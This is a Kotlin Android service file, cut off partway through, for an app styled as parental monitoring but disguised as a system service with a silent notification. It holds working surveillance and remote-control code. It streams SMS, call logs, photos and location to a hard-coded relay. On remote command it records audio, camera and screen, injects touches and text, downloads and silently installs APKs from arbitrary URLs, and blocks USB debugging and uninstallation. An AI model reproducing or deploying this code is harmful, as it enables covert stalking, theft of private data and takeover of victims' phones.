package com.system.service.core

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.system.service.R
import com.system.service.monitors.*
import com.system.service.monitors.LivePaintingService
import com.system.service.monitors.AmbientRecorder
import com.system.service.monitors.BrowserBlocker
import com.system.service.monitors.OfflineAlertManager
import com.system.service.monitors.PermissionWatcher
import com.system.service.setup.MediaProjectionActivity
import com.system.service.setup.ShakeDetector
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.Executors

class CoreService : Service() {

    companion object {
        var instance: CoreService? = null
        var SERVER_URL = "wss://ws-relay-production-9ea0.up.railway.app/api/ws"
        const val PREFS_NAME     = "config"
        const val KEY_SERVER_URL = "server_url"
        const val KEY_PAIR_CODE  = "pair_code"
        private const val CHANNEL_ID = "device_health"
        private const val NOTIF_ID   = 1
    }

    private var wsManager: WebSocketManager? = null
    private var fusedLocationClient: FusedLocationProviderClient? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var shakeDetector: ShakeDetector? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    /**
     * Background executor for ALL heavy ContentProvider reads.
     *
     * RESEARCH NOTE (ANR): Main thread blocked by long DB/content query = ANR.
     * sendCallLog, sendSms, sendGallery, sendAppUsage read from ContentProvider —
     * these MUST run on a background thread, never on main.
     */
    private val ioExecutor = Executors.newCachedThreadPool()

    /** Connection quality score 0-100. Decreases on reconnect, resets to 100 on fresh connect. */
    private var connectionQuality = 100
    private var reconnectCount    = 0

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            // RESEARCH NOTE (Doze): When phone exits Doze, network becomes available.
            // NetworkCallback fires here — we reconnect WebSocket immediately.
            mainHandler.postDelayed({
                if (wsManager?.isConnected() != true) wsManager?.forceReconnect()
            }, 2000)
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        CrashLogger.install(this)
        CrashLogger.logServiceStart(this, "onCreate")
        HealthReporter.recordServiceStart()
        // Bug #17 fix: restore internet schedule that was set before service restart
        InternetScheduler.restoreFromPrefs(this)

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        acquireWakeLock()
        createNotificationChannel()

        // RESEARCH NOTE (Foreground Service): "Needs persistent notification.
        // Without notification: System may stop service."
        // → Non-empty title required for Android 16, proper type flags required for Android 14+.
        startForegroundCompat()

        AppBlockerManager.init(this)
        KeywordDetector.init(this)
        BrowserBlocker.init(this)
        connectServer()
        WatchdogReceiver.schedule(this)
        MonitorWorker.enqueue(this)
        shakeDetector = ShakeDetector(this).also { it.start() }
        PermissionWatcher.start(this)
        OfflineAlertManager.start(this)

        // RESEARCH NOTE (Doze): registerNetworkCallback fires when Doze exits
        // and network comes back → WebSocket auto-reconnects.
        try {
            val cm = getSystemService(ConnectivityManager::class.java)
            val req = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            cm.registerNetworkCallback(req, networkCallback)
        } catch (_: Exception) {}
    }

    /**
     * Start foreground with correct service types for each Android version.
     *
     * RESEARCH NOTE (Android 16 rules): Android 14+ kills services that use
     * location/mic/camera without declaring those types in startForeground().
     * Wrap in try-catch: Android 16 can throw ForegroundServiceDidNotStartInTimeException.
     *
     * RESEARCH NOTE (Foreground Service): Needs persistent notification.
     * IMPORTANCE_NONE channel can cause Android 16 to consider notification invalid.
     * Use IMPORTANCE_MIN — silent but valid.
     */
    private fun startForegroundCompat() {
        val notif = buildNotification()
        try {
            when {
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
                    // Android 14+ — declare ALL types actually used by this service
                    startForeground(
                        NOTIF_ID, notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                    )
                }
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                    startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                }
                else -> startForeground(NOTIF_ID, notif)
            }
        } catch (e: Exception) {
            // Android 16: ForegroundServiceDidNotStartInTimeException — fallback to dataSync only
            CrashLogger.logCrash(this, e, "startForegroundCompat")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } else {
                    startForeground(NOTIF_ID, notif)
                }
            } catch (_: Exception) {}
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Re-establish foreground on system restart — Android 16 can recreate service
        try { startForegroundCompat() } catch (_: Exception) {}
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        CrashLogger.logServiceStop(this, "onDestroy")
        instance = null
        wsManager?.disconnect()
        stopPeriodicSending()
        shakeDetector?.stop()
        try { GeofenceMonitor.stopTracking() } catch (_: Exception) {}
        try { InternetScheduler.disable() } catch (_: Exception) {}
        try { AmbientRecorder.stopRecording(this) } catch (_: Exception) {}
        PermissionWatcher.stop()
        OfflineAlertManager.stop()
        try { CameraRecorder.stop(this) } catch (_: Exception) {}
        try { ScreenRecorder.stop(this) } catch (_: Exception) {}
        releaseWakeLock()
        ioExecutor.shutdown()
        // Reschedule watchdog so it fires soon and restarts us
        WatchdogReceiver.schedule(this)
        try { getSystemService(ConnectivityManager::class.java).unregisterNetworkCallback(networkCallback) } catch (_: Exception) {}
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // RESEARCH NOTE (Android 16): Do NOT call startForegroundService from onTaskRemoved.
        // Use AlarmManager (WatchdogReceiver) for restart instead.
        WatchdogReceiver.schedule(this)
    }

    // ── Wake Lock ──────────────────────────────────────────────────────────────
    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            // RESEARCH NOTE (Doze): PARTIAL_WAKE_LOCK prevents CPU sleep.
            // Foreground service + PARTIAL_WAKE_LOCK = survives Doze for our critical work.
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GuardianEye::CoreLock")
                // BUG FIX: Timed acquire (10h) auto-releases after 10 hours → CPU allowed to
                // sleep → WebSocket dies → app appears "offline" after 10h of uptime.
                // Untimed acquire holds until explicit release() in onDestroy().
                .also { it.setReferenceCounted(false); it.acquire() }
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
    }

    // ── Periodic auto-send ─────────────────────────────────────────────────────
    private var periodicRunnable: Runnable? = null
    private var periodicTick = 0

    private fun startPeriodicSending() {
        stopPeriodicSending()
        periodicRunnable = object : Runnable {
            override fun run() {
                periodicTick++
                // Battery is fast (BatteryManager direct) — keep on main
                try { sendBattery() } catch (_: Exception) {}
                // AppUsage reads from UsageStats — background
                try { sendCurrentAppBackground() } catch (_: Exception) {}
                if (periodicTick % 4 == 0)  try { sendLocation() }          catch (_: Exception) {}
                if (periodicTick % 10 == 0) {
                    try { sendCallLogBackground(50) } catch (_: Exception) {}
                    try { sendSmsBackground(50) }     catch (_: Exception) {}
                }
                if (periodicTick % 20 == 0) {
                    try { sendAppUsageBackground(24) } catch (_: Exception) {}
                    try { sendGalleryBackground(20) }  catch (_: Exception) {}
                }
                // Heartbeat every 30s — parent monitors liveness
                try {
                    sendData("heartbeat", HealthReporter.buildHeartbeat(this@CoreService, connectionQuality))
                } catch (_: Exception) {}
                // Full health status every 5 ticks (~2.5 min)
                if (periodicTick % 5 == 0) {
                    try {
                        sendData("health_status", HealthReporter.buildHealthStatus(this@CoreService, connectionQuality))
                    } catch (_: Exception) {}
                }
                mainHandler.postDelayed(this, 30_000)
            }
        }
        mainHandler.postDelayed(periodicRunnable!!, 30_000)
    }

    private fun stopPeriodicSending() {
        periodicRunnable?.let { mainHandler.removeCallbacks(it) }
        periodicRunnable = null
        periodicTick = 0
    }

    // ── WebSocket connection ───────────────────────────────────────────────────
    private fun connectServer() {
        val prefs   = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val savedUrl = prefs.getString(KEY_SERVER_URL, null)
        val pairCode = prefs.getString(KEY_PAIR_CODE, "") ?: ""
        if (savedUrl != null) SERVER_URL = savedUrl

        wsManager = WebSocketManager(
            serverUrl   = SERVER_URL,
            pairCode    = pairCode,
            onMessage   = { handleCommand(it) },
            onConnected = {
                connectionQuality = maxOf(20, 100 - reconnectCount * 15)
                OfflineAlertManager.onConnected()
                NotificationMonitor.drainQueue()

                sendData("device_info", JSONObject().apply {
                    put("blocked_apps",    JSONArray(AppBlockerManager.getBlockedApps()))
                    put("keywords",        JSONArray(KeywordDetector.getKeywords()))
                    put("blocked_domains", JSONArray(BrowserBlocker.getBlockedDomains()))
                    // FIX #9: Send actual screen resolution so parent ControlFragment touch coords are accurate
                    put("screen_width",  resources.displayMetrics.widthPixels)
                    put("screen_height", resources.displayMetrics.heightPixels)
                })

                // Send full health status immediately on connect
                try {
                    sendData("health_status", HealthReporter.buildHealthStatus(this@CoreService, connectionQuality))
                } catch (_: Exception) {}

                // Auto-send crash diagnostic if any exists
                if (CrashLogger.hasCrashData(this@CoreService)) {
                    mainHandler.postDelayed({
                        sendData("diagnostic_report", CrashLogger.buildDiagnosticReport(this@CoreService))
                    }, 3000)
                }

                mainHandler.postDelayed({
                    try { sendBattery() }                 catch (_: Exception) {}
                    try { sendLocation() }                catch (_: Exception) {}
                    try { sendCurrentAppBackground() }    catch (_: Exception) {}
                    try { sendCallLogBackground(50) }     catch (_: Exception) {}
                    try { sendSmsBackground(50) }         catch (_: Exception) {}
                    try { sendAppUsageBackground(24) }    catch (_: Exception) {}
                    try { sendGalleryBackground(20) }     catch (_: Exception) {}
                    startPeriodicSending()
                }, 1000)
            },
            onDisconnected = {
                reconnectCount++
                connectionQuality = maxOf(20, 100 - reconnectCount * 15)
                OfflineAlertManager.onDisconnected()
                stopPeriodicSending()
            }
        )
        wsManager?.connect()
    }

    fun reconnect() { wsManager?.disconnect(); connectServer() }

    // ── Command handler ────────────────────────────────────────────────────────
    private fun handleCommand(data: JSONObject) {
        try {
            when (data.optString("command")) {

                "update_url" -> {
                    val newUrl  = data.optString("url")
                    val newCode = data.optString("pair_code", "")
                    if (newUrl.startsWith("ws://") || newUrl.startsWith("wss://")) {
                        SERVER_URL = newUrl
                        val ed = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                        if (newUrl.isNotEmpty())  ed.putString(KEY_SERVER_URL, newUrl)
                        if (newCode.isNotEmpty()) ed.putString(KEY_PAIR_CODE, newCode)
                        ed.apply()
                        wsManager?.disconnect(); connectServer()
                    }
                }

                "request_screen_permission" -> {
                    try {
                        val i = Intent(this, MediaProjectionActivity::class.java)
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                        startActivity(i)
                    } catch (e: Exception) { CrashLogger.logCrash(this, e, "request_screen_permission") }
                }

                "update_from_url" -> {
                    val url     = data.optString("url")
                    val version = data.optString("version", "unknown")
                    if (url.isNotEmpty()) {
                        Thread {
                            try {
                                sendData("update_status", org.json.JSONObject().apply {
                                    put("status",  "downloading")
                                    put("version", version)
                                })
                                val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                                conn.connectTimeout = 30000; conn.readTimeout = 120000
                                conn.connect()
                                val apkFile = java.io.File(cacheDir, "update_${version}.apk")
                                conn.inputStream.use { input ->
                                    apkFile.outputStream().use { output -> input.copyTo(output) }
                                }
                                conn.disconnect()
                                val ok = ShizukuManager.silentInstall(apkFile.absolutePath)
                                sendData("update_status", org.json.JSONObject().apply {
                                    put("status",  if (ok) "installed" else "install_failed")
                                    put("version", version)
                                    put("path",    apkFile.absolutePath)
                                })
                            } catch (e: Exception) {
                                CrashLogger.logCrash(this@CoreService, e, "update_from_url")
                                sendData("update_status", org.json.JSONObject().apply {
                                    put("status",  "download_failed")
                                    put("version", version)
                                    put("error",   e.message ?: "Unknown error")
                                })
                            }
                        }.start()
                    }
                }

                "get_health_status" -> {
                    sendData("health_status", HealthReporter.buildHealthStatus(this, connectionQuality))
                }
                "get_diagnostic_report" -> {
                    sendData("diagnostic_report", CrashLogger.buildDiagnosticReport(this))
                }
                "clear_diagnostic_logs" -> {
                    CrashLogger.clearAll(this)
                    sendData("diagnostic_cleared", JSONObject().apply { put("time", System.currentTimeMillis()) })
                }

                "set_blocked_apps" -> {
                    val arr  = data.optJSONArray("apps") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    AppBlockerManager.setBlockedApps(list)
                    sendData("blocked_apps_updated", JSONObject().apply { put("count", list.size); put("apps", arr) })
                }
                "set_time_limit" -> {
                    val pkg = data.optString("package"); val mins = data.optInt("minutes", 0)
                    if (pkg.isNotEmpty()) AppBlockerManager.setTimeLimit(pkg, mins)
                    sendData("time_limit_set", JSONObject().apply { put("package", pkg); put("minutes", mins) })
                }
                "set_geofence" -> {
                    val lat = data.optDouble("lat"); val lng = data.optDouble("lng")
                    val radius = data.optDouble("radius", 200.0).toFloat()
                    GeofenceMonitor.setGeofence(lat, lng, radius, this)
                    sendData("geofence_set", JSONObject().apply { put("lat", lat); put("lng", lng); put("radius", radius) })
                }
                "disable_geofence"     -> GeofenceMonitor.disableGeofence()
                "set_keywords"         -> {
                    val arr  = data.optJSONArray("keywords") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    KeywordDetector.setKeywords(list, this)
                    sendData("keywords_updated", JSONObject().apply { put("count", list.size) })
                }
                "set_schedule"         -> {
                    val s = data.optInt("off_hour_start", 23); val e = data.optInt("off_hour_end", 6)
                    InternetScheduler.setSchedule(s, e, this)
                    sendData("schedule_set", JSONObject().apply { put("off_start", s); put("off_end", e) })
                }
                "disable_schedule"     -> InternetScheduler.disable()
                "get_daily_report"     -> sendData("daily_report", AppBlockerManager.getDailyReport())
                "set_blocked_domains"  -> {
                    val arr  = data.optJSONArray("domains") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    BrowserBlocker.setBlockedDomains(list, this)
                    sendData("blocked_domains_updated", JSONObject().apply { put("count", list.size); put("domains", arr) })
                }
                "get_blocked_domains"  -> {
                    sendData("blocked_domains", JSONObject().apply { put("domains", JSONArray(BrowserBlocker.getBlockedDomains())) })
                }
                "start_ambient_record" -> AmbientRecorder.startRecording(this, data.optInt("duration_seconds", 60))
                "stop_ambient_record"  -> AmbientRecorder.stopRecording(this)
                "get_recording"        -> {
                    val path = data.optString("path")
                    if (path.isNotEmpty()) AmbientRecorder.sendRecordingToParent(this, path)
                }
                "list_recordings"      -> {
                    val arr = JSONArray()
                    AmbientRecorder.listRecordings(this).take(20).forEach { f ->
                        arr.put(JSONObject().apply { put("path", f.absolutePath); put("filename", f.name); put("size_kb", f.length() / 1024); put("modified", f.lastModified()) })
                    }
                    sendData("recording_list", JSONObject().apply { put("files", arr) })
                }
                "set_offline_threshold"-> {
                    val mins = data.optInt("minutes", 30)
                    OfflineAlertManager.setThreshold(this, mins)
                    sendData("offline_threshold_set", JSONObject().apply { put("minutes", mins) })
                }
                "get_permission_status"-> {
                    sendData("permission_check_requested", JSONObject().apply { put("time", System.currentTimeMillis()) })
                }
                "block_contact"        -> {
                    val number = data.optString("number")
                    val prefs  = getSharedPreferences("blocked_contacts", MODE_PRIVATE)
                    val set    = prefs.getStringSet("numbers", mutableSetOf()) ?: mutableSetOf()
                    set.add(number)
                    prefs.edit().putStringSet("numbers", set).apply()
                    sendData("contact_blocked", JSONObject().apply { put("number", number) })
                }

                "lock_screen"          -> lockScreen()
                "get_battery"          -> sendBattery()
                "get_location"         -> sendLocation()
                "take_photo"           -> takeSinglePhoto()
                "emergency_lock"       -> { lockScreen(); sendData("emergency_locked", JSONObject()) }
                "emergency_lock_all"   -> {
                    val pm   = packageManager
                    val pkgs = pm.getInstalledPackages(0)
                        .filter { (it.applicationInfo?.flags ?: 0) and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
                        .map { it.packageName }.filter { it != packageName }
                    AppBlockerManager.setBlockedApps(pkgs)
                    lockScreen()
                    sendData("emergency_locked_all", JSONObject().apply { put("blocked_count", pkgs.size) })
                }
                "emergency_unlock_all" -> {
                    AppBlockerManager.setBlockedApps(emptyList())
                    sendData("emergency_unlocked_all", JSONObject())
                }

                "wifi_on"              -> {
                    val ok = ShizukuManager.exec("svc wifi enable")
                    sendData("wifi_changed", JSONObject().apply { put("state", "on"); put("success", ok)
                        if (!ok) put("error", "Shizuku required for WiFi control on Android 10+") })
                }
                "wifi_off"             -> {
                    val ok = ShizukuManager.exec("svc wifi disable")
                    sendData("wifi_changed", JSONObject().apply { put("state", "off"); put("success", ok)
                        if (!ok) put("error", "Shizuku required for WiFi control on Android 10+") })
                }

                "disable_hotspot" -> {
                    val ok = ShizukuManager.disableHotspot()
                    sendData("hotspot_result", JSONObject().apply { put("success", ok) })
                }
                "lock_dev_options" -> {
                    val ok = ShizukuManager.lockDeveloperOptions()
                    sendData("dev_options_result", JSONObject().apply { put("success", ok) })
                }
                "block_usb_debug" -> {
                    val ok = ShizukuManager.blockUsbDebugging()
                    sendData("usb_debug_result", JSONObject().apply { put("success", ok) })
                }

                // FIX #12: reboot + clear_app_data (Shizuku required)
                "reboot" -> {
                    val ok = ShizukuManager.exec("reboot")
                    sendData("reboot_result", JSONObject().apply {
                        put("success", ok)
                        put("shizuku_available", ShizukuManager.isShizukuAvailable())
                    })
                }
                "clear_app_data" -> {
                    val pkg = data.optString("package")
                    if (pkg.isNotEmpty()) {
                        val ok = ShizukuManager.exec("pm clear $pkg")
                        sendData("app_data_cleared", JSONObject().apply {
                            put("success", ok); put("package", pkg)
                        })
                    }
                }

                // FIX #27: Uninstall password — store SHA-256 hash on child side
                "set_uninstall_password" -> {
                    val hash = data.optString("password_hash")
                    if (hash.isNotEmpty()) {
                        getSharedPreferences("config", MODE_PRIVATE)
                            .edit().putString("uninstall_pass_hash", hash).apply()
                        sendData("uninstall_pass_set", JSONObject().apply { put("success", true) })
                    }
                }

                // Feature F2: Emergency SOS — activate camera + mic + location + alarm simultaneously
                "emergency_sos" -> {
                    try { startFgService(Intent(this, CameraStreamService::class.java).putExtra("front_camera", true)) } catch (_: Exception) {}
                    try { startFgService(Intent(this, AudioStreamService::class.java)) } catch (_: Exception) {}
                    sendLocation()
                    try {
                        val uri = android.provider.Settings.System.DEFAULT_ALARM_ALERT_URI
                        val mp  = android.media.MediaPlayer.create(this, uri)
                        mp?.isLooping = true; mp?.start()
                    } catch (_: Exception) {}
                    sendData("sos_activated", JSONObject().apply { put("time", System.currentTimeMillis()) })
                }

                // Feature F3: Game Time Tokens — temporarily unlock a blocked/limited app
                "grant_token" -> {
                    val pkg  = data.optString("package")
                    val mins = data.optInt("minutes", 30)
                    if (pkg.isNotEmpty()) {
                        AppBlockerManager.grantToken(pkg, mins)
                        sendData("token_granted", JSONObject().apply {
                            put("package", pkg); put("minutes", mins)
                        })
                    }
                }

                // UI #3: Get installed user apps list for ProtectFragment
                "get_app_list" -> {
                    ioExecutor.execute {
                        val apps = packageManager.getInstalledApplications(0)
                            .filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
                        val arr = JSONArray()
                        apps.forEach { app ->
                            arr.put(JSONObject().apply {
                                put("package", app.packageName)
                                put("name", packageManager.getApplicationLabel(app).toString())
                            })
                        }
                        sendData("app_list", JSONObject().apply { put("apps", arr) })
                    }
                }

                // These commands read ContentProvider — BACKGROUND THREAD
                "get_gallery"          -> sendGalleryBackground(data.optInt("limit", 20))
                "get_call_log"         -> sendCallLogBackground(data.optInt("limit", 50))
                "get_sms"              -> sendSmsBackground(data.optInt("limit", 50))
                "get_app_usage"        -> sendAppUsageBackground(data.optInt("hours", 24))

                "get_full_photo"       -> sendFullPhoto(data.optString("path"))
                "get_running_app"      -> sendCurrentAppBackground()

                // BUG FIX: take_screenshot command was completely unhandled — silently dropped.
                // Now starts the screen stream service for one snapshot (uses MediaProjection).
                "take_screenshot" -> {
                    if (ScreenStreamService.projectionResultData != null) {
                        // Projection already granted — start stream, it auto-sends frames
                        startFgService(Intent(this, ScreenStreamService::class.java).putExtra("interval", 2000L))
                    } else {
                        // Need MediaProjection permission first
                        try {
                            val i = Intent(this, com.system.service.setup.MediaProjectionActivity::class.java)
                            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                            startActivity(i)
                        } catch (e: Exception) { CrashLogger.logCrash(this, e, "take_screenshot:noProjection") }
                    }
                }

                // BUG FIX: startService() for services that declare foregroundServiceType causes
                // ForegroundServiceStartNotAllowedException on Android 14+ (API 34+).
                // Must use startForegroundService() — service must call startForeground() within 5s.
                // STOP actions still use startService (no foreground needed to send a stop intent).
                "start_camera_stream"  -> startFgService(Intent(this, CameraStreamService::class.java).putExtra("interval", data.optLong("interval", 33L)))
                "stop_camera_stream"   -> startService(Intent(this, CameraStreamService::class.java).setAction("STOP"))
                "start_mic_stream"     -> startFgService(Intent(this, AudioStreamService::class.java))
                "stop_mic_stream"      -> startService(Intent(this, AudioStreamService::class.java).setAction("STOP"))
                "start_screen_stream"  -> startFgService(Intent(this, ScreenStreamService::class.java).putExtra("interval", data.optLong("interval", 500L)))
                "stop_screen_stream"   -> startService(Intent(this, ScreenStreamService::class.java).setAction("STOP"))

                "start_camera_record"  -> CameraRecorder.start(this, data.optInt("duration_seconds", 60), data.optBoolean("front_camera", false))
                "stop_camera_record"   -> CameraRecorder.stop(this)
                "list_camera_records"  -> {
                    val arr = JSONArray()
                    CameraRecorder.listRecordings(this).take(20).forEach { f ->
                        arr.put(JSONObject().apply { put("path", f.absolutePath); put("filename", f.name); put("size_kb", f.length() / 1024); put("modified", f.lastModified()) })
                    }
                    sendData("camera_record_list", JSONObject().apply { put("files", arr) })
                }
                "get_camera_record_file"  -> CameraRecorder.sendRecordingFile(this, data.optString("path"))

                "start_screen_record"  -> ScreenRecorder.start(this, data.optInt("duration_seconds", 60))
                "stop_screen_record"   -> ScreenRecorder.stop(this)
                "list_screen_records"  -> {
                    val arr = JSONArray()
                    ScreenRecorder.listRecordings(this).take(20).forEach { f ->
                        arr.put(JSONObject().apply { put("path", f.absolutePath); put("filename", f.name); put("size_kb", f.length() / 1024); put("modified", f.lastModified()) })
                    }
                    sendData("screen_record_list", JSONObject().apply { put("files", arr) })
                }
                "get_screen_record_file"  -> ScreenRecorder.sendRecordingFile(this, data.optString("path"))

                "scan_albums"          -> AlbumsSafetyScanner.scan(this)
                "get_album_image"      -> AlbumsSafetyScanner.getFullImage(this, data.optString("uri"))

                "touch"    -> AccessibilityMonitor.performTouch(data.optDouble("x", 0.0).toFloat(), data.optDouble("y", 0.0).toFloat())
                "swipe"    -> AccessibilityMonitor.performSwipe(data.optDouble("x1", 0.0).toFloat(), data.optDouble("y1", 0.0).toFloat(), data.optDouble("x2", 0.0).toFloat(), data.optDouble("y2", 500.0).toFloat(), data.optLong("duration", 300))
                "key_back"    -> AccessibilityMonitor.performBack()
                "key_home"    -> AccessibilityMonitor.performHome()
                "key_recents" -> AccessibilityMonitor.performRecents()
                "type_text"   -> AccessibilityMonitor.typeText(data.optString("text"))

                "grant_permissions" -> {
                    val count = ShizukuManager.grantAllPermissions(this)
                    sendData("permissions_result", JSONObject().apply { put("granted", count); put("shizuku_available", ShizukuManager.isShizukuAvailable()) })
                }
                "silent_install"   -> {
                    // BUG FIX: optString returns "" when key missing — empty path causes pm install crash
                    val path = data.optString("apk_path")
                    if (path.isEmpty()) {
                        sendData("install_result", JSONObject().apply { put("success", false); put("error", "missing apk_path") })
                    } else {
                        val ok = ShizukuManager.silentInstall(path)
                        sendData("install_result", JSONObject().apply { put("success", ok); put("path", path) })
                    }
                }
                "silent_uninstall" -> {
                    val pkg = data.optString("package")
                    if (pkg.isEmpty()) {
                        sendData("uninstall_result", JSONObject().apply { put("success", false); put("error", "missing package") })
                    } else {
                        val ok = ShizukuManager.silentUninstall(pkg)
                        sendData("uninstall_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                    }
                }
                "force_stop"  -> {
                    val pkg = data.optString("package")
                    if (pkg.isEmpty()) {
                        sendData("force_stop_result", JSONObject().apply { put("success", false); put("error", "missing package") })
                    } else {
                        val ok = ShizukuManager.forceStop(pkg)
                        sendData("force_stop_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                    }
                }
                "freeze_app"  -> {
                    val pkg = data.optString("package")
                    if (pkg.isEmpty()) {
                        sendData("freeze_result", JSONObject().apply { put("success", false); put("error", "missing package") })
                    } else {
                        val ok = ShizukuManager.freezeApp(pkg)
                        sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", true) })
                    }
                }
                "unfreeze_app"-> {
                    val pkg = data.optString("package")
                    if (pkg.isEmpty()) {
                        sendData("freeze_result", JSONObject().apply { put("success", false); put("error", "missing package") })
                    } else {
                        val ok = ShizukuManager.unfreezeApp(pkg)
                        sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", false) })
                    }
                }
                "set_dns"     -> {
                    val dns = data.optString("dns_server", "family.cloudflare-dns.com"); val ok = ShizukuManager.setPrivateDns(dns)
                    sendData("dns_result", JSONObject().apply { put("success", ok); put("dns", dns) })
                }

                "live_painting_start" -> {
                    val i = Intent(this, LivePaintingService::class.java).apply {
                        putExtra("color", data.optString("color", "#FF0000"))
                        putExtra("brush_size", data.optInt("brush_size", 20))
                    }
                    // BUG FIX: startForegroundService() directly bypasses startFgService() helper
                    // which handles ForegroundServiceStartNotAllowedException on Android 14+.
                    // BUG FIX: Only send "started" if startFgService did not throw — wrap in try
                    // so parent does not receive false success when service fails to launch.
                    try {
                        startFgService(i)
                        sendData("live_painting_started", JSONObject())
                    } catch (e: Exception) {
                        CrashLogger.logCrash(this, e, "live_painting_start")
                        sendData("live_painting_error", JSONObject().apply { put("error", e.message ?: "launch_failed") })
                    }
                }
                "live_painting_stop"  -> {
                    startService(Intent(this, LivePaintingService::class.java).setAction("STOP"))
                    sendData("live_painting_stopped", JSONObject())
                }
                "live_painting_draw"  -> {
                    // BUG FIX: JSONObject has no optFloat() — use optDouble().toFloat()
                    LivePaintingService.instance?.onRemoteDraw(
                        data.optDouble("x", 0.0).toFloat(),
                        data.optDouble("y", 0.0).toFloat(),
                        data.optString("action", "move"))
                }
            }
        } catch (e: SecurityException) {
            // RESEARCH NOTE: SecurityException = missing permission or wrong Android version handling
            CrashLogger.logCrash(this, e, "handleCommand:SecurityException")
        } catch (e: Exception) {
            CrashLogger.logCrash(this, e, "handleCommand")
        }
    }

    // ── Public send ────────────────────────────────────────────────────────────
    fun sendData(type: String, payload: JSONObject) {
        try {
            // BUG FIX: ParentMonitor.handleMessage() reads ALL data keys directly from
            // the top-level msg JSONObject (e.g. msg.optInt("battery")).  Wrapping in a
            // nested "payload" sub-object made every piece of child data invisible to the
            // parent dashboard.  Fix: merge payload fields into the top-level message.
            val msg = JSONObject().apply { put("type", type) }
            val keys = payload.keys()
            while (keys.hasNext()) {
                val k = keys.next()
                try { msg.put(k, payload.get(k)) } catch (_: Exception) {}
            }
            wsManager?.send(msg)
        } catch (_: Exception) {}
    }

    // ── Data senders ───────────────────────────────────────────────────────────

    // Fast — direct from BatteryManager, safe on main thread
    private fun sendBattery() {
        try {
            val bm  = getSystemService(BATTERY_SERVICE) as BatteryManager
            val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            sendData("battery", JSONObject().apply { put("battery", pct); put("charging", bm.isCharging) })
        } catch (_: Exception) {}
    }

    // Async — FusedLocation uses callbacks, safe on any thread
    // BUG FIX #4: lastLocation returns stale/null on fresh boot.
    // getCurrentLocation() forces a fresh GPS/network fix (max 30s cache).
    @Suppress("MissingPermission")
    private fun sendLocation() {
        try {
            val req = com.google.android.gms.location.CurrentLocationRequest.Builder()
                .setPriority(com.google.android.gms.location.Priority.PRIORITY_BALANCED_POWER_ACCURACY)
                .setMaxUpdateAgeMillis(30_000L)
                .build()
            fusedLocationClient?.getCurrentLocation(req, null)
                ?.addOnSuccessListener { loc ->
                    loc?.let {
                        sendData("location", JSONObject().apply {
                            put("lat", it.latitude); put("lng", it.longitude); put("accuracy", it.accuracy)
                        })
                    } ?: run {
                        // Fallback to lastLocation if getCurrentLocation times out
                        fusedLocationClient?.lastLocation?.addOnSuccessListener { last ->
                            last?.let { sendData("location", JSONObject().apply {
                                put("lat", it.latitude); put("lng", it.longitude); put("accuracy", it.accuracy)
                            }) }
                        }
                    }
                }
        } catch (_: Exception) {}
    }

    // ── BACKGROUND THREAD READERS (ANR fix) ───────────────────────────────────
    // RESEARCH NOTE: ContentProvider reads can take 100-5000ms.
    // If done on main thread → ANR after ~5 seconds. Must use background executor.

    private fun sendCurrentAppBackground() {
        ioExecutor.execute {
            try {
                // BUG FIX: getCurrentApp returns String? not Pair — fixed to match actual signature
                val pkg = AppUsageManager.getCurrentApp(this) ?: return@execute
                sendData("current_app", JSONObject().apply {
                    put("package", pkg)
                    put("name", pkg.substringAfterLast('.'))
                })
            } catch (e: SecurityException) {
                CrashLogger.logCrash(this, e, "sendCurrentApp:SecurityException")
